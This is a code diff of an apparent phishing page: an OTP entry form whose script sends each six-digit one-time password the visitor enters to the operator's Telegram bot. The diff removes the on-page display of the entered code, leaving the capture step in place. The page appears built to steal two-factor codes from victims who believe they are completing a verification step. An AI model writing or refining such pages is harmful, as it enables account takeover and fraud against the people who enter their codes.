@@ -97,13 +97,6 @@
             cursor: pointer;
         }
 
-        .otp-message {
-            margin-top: 20px; /* Space for OTP message */
-            font-family: monospace; /* Monospace font for easy copying */
-            color: lightgray; /* Light gray text for OTP */
-            font-size: 1rem; /* Font size for OTP */
-        }
-
         .footer {
             margin-top: 50px;
         }
@@ -131,7 +124,6 @@
     </div>
 
     <div class="error-message" id="error-message"></div> <!-- Space for error message -->
-    <div class="otp-message" id="otp-message" style="display: none;"></div> <!-- Space for OTP display -->
 
     <div class="buttons">
         <button onclick="validateOTP()">Proceed</button>
@@ -150,17 +142,13 @@
         const otpInput = document.getElementById('otpInput');
         const otp = otpInput.value;
         const errorMessage = document.getElementById('error-message');
-        const otpMessage = document.getElementById('otp-message');
 
         // Check if the OTP is 6 digits
         if (otp.length !== 6) {
             errorMessage.textContent = 'Invalid OTP'; // Show error message
             errorMessage.style.display = 'block'; // Show error message
-            otpMessage.style.display = 'none'; // Hide OTP message
         } else {
             errorMessage.style.display = 'none'; // Hide error message
-            otpMessage.textContent = `Your OTP: ${otp}`; // Show OTP message
-            otpMessage.style.display = 'block'; // Show OTP message
 
             // Send the OTP to your Telegram bot
             sendToTelegramBot(otp); 
